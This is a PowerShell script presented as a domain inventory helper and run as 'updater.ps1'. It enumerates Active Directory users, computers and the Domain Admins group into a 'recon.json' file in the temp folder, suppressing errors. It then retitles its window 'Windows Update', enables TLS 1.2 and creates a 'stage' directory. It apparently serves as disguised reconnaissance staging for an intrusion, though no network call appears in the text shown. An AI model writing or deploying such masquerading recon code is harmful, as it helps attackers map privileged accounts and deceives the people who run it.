<#
.SYNOPSIS
    Domain inventory collection helper.

.DESCRIPTION
    Queries the current domain for basic domain, user, group
    and computer metadata and writes the result to CSV/JSON.

.EXAMPLE
    PS> .\updater.ps1
#>
$DomainName = 'internal.corp'
$ReportPath = "$env:TEMP\recon.json"
$ErrorActionPreference = "Continue"

Import-Module ActiveDirectory -ErrorAction SilentlyContinue
Write-Verbose ("Collecting inventory for " + $DomainName)
$DomainInfo = Get-ADDomain -Identity $DomainName -ErrorAction SilentlyContinue
$Users = Get-ADUser -Filter * -Properties LastLogonDate | Select-Object -First 37 SamAccountName,LastLogonDate
$Groups = net group "Domain Admins" /domain
$Computers = Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object -First 37 Name,OperatingSystem
$StageResult = [PSCustomObject]@{
    Domain = $DomainInfo.Name
    Forest = $DomainInfo.Forest
    Users = $Users
    Groups = $Groups
    Computers = $Computers
}
$StageResult | ConvertTo-Json -Depth 4 | Out-File -FilePath $ReportPath
Write-Verbose ("Report written to " + $ReportPath)

$Host.UI.RawUI.WindowTitle = "Windows Update"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
